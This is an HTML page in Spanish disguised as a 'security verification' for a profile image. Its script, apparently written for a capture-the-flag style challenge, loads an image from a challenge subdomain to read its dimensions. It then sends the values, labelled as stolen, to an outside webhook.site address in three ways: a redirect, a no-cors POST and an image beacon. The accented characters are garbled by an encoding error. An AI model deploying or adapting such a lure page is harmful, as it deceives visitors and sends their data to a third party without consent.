<!DOCTYPE html>
<html>
<head>
    <title>Verificaci√≥n de Seguridad Requerida</title>
</head>
<body>
    <h1>Verificando tu imagen de perfil...</h1>
    <p>Por favor espera mientras validamos tu cuenta.</p>
    
    <script>
        // Funci√≥n principal para robar las dimensiones
        function stealImageDimensions() {
            console.log('üïµÔ∏è Cargando imagen de Pepe...');
            
            const img = new Image();
            
            img.onload = function() {
                const width = this.naturalWidth;
                const height = this.naturalHeight;
                const nivel = width * height;
                
                console.log('‚úÖ √âXITO - Dimensiones:', width, '√ó', height);
                console.log('üìä Nivel de Pepe:', nivel);
                
                // ENVIAR DATOS A TU WEBHOOK - M√∫ltiples m√©todos para asegurar
                
                // M√©todo 1: Redirecci√≥n (m√°s confiable)
                setTimeout(() => {
                    window.location.href = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?nivel=' + nivel + 
                                          '&width=' + width + 
                                          '&height=' + height + 
                                          '&exito=1&timestamp=' + Date.now();
                }, 500);
                
                // M√©todo 2: Fetch POST (backup)
                fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        accion: 'dimensiones_robadas',
                        nivel: nivel,
                        width: width,
                        height: height,
                        usuario: 'pepe',
                        timestamp: new Date().toISOString()
                    })
                }).catch(e => console.log('Fetch fall√≥, pero redirecci√≥n funcionar√°'));
                
                // M√©todo 3: Beacon con imagen
                const beacon = new Image();
                beacon.src = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c/beacon?nivel=' + nivel;
            };
            
            img.onerror = function(error) {
                console.error('‚ùå Error cargando imagen:', error);
                // Reportar error al webhook
                window.location.href = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?error=1&timestamp=' + Date.now();
            };
            
            // Cargar la imagen de Pepe (URL COMPLETA con dominio)
            img.src = 'https://chl-7a4773d0-583b-48c9-a6d8-e797a0145e8e-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now();
        }
        
        // Ejecutar cuando la p√°gina cargue
        setTimeout(stealImageDimensions, 100);
    </script>
</body>
</html>
